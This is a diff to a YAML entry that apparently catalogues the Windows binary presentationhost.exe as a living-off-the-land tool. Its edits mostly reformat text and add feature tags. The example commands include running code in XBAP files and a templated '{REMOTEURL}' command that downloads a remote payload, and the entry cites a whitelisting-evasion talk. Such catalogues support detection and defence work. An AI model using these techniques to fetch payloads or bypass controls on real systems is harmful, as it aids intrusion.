@@ -2,7 +2,8 @@
 id: windows-execution-presentationhost
 namespace: windows:execution:presentationhost
 name: presentationhost
-description: 'File is used for executing Browser applications Located at: C:\Windows\System32\Presentationhost.exe; C:\Windows\SysWOW64\Presentationhost.exe.'
+description: 'File is used for executing Browser applications Located at: C:\Windows\System32\Presentationhost.exe;
+  C:\Windows\SysWOW64\Presentationhost.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -43,7 +44,12 @@ resource_profile:
 allowed-tools:
 - presentationhost
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
 execution:
   template: presentationhost
   sandbox: execFile
@@ -51,9 +57,11 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Executes the target XAML Browser Application (XBAP) file (Execute code within XBAP files)
+- description: Executes the target XAML Browser Application (XBAP) file (Execute code
+    within XBAP files)
   command: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
-- description: It will download a remote payload and place it in INetCache. (Downloads payload from remote server)
+- description: It will download a remote payload and place it in INetCache. (Downloads
+    payload from remote server)
   command: Presentationhost.exe {REMOTEURL}
 references:
 - label: ShmooCon-2015-Simple-WLEvasion.pdf
@@ -80,7 +88,6 @@ install:
   commands:
   - choco install presentationhost
 ---
-
 
 # presentationhost
 
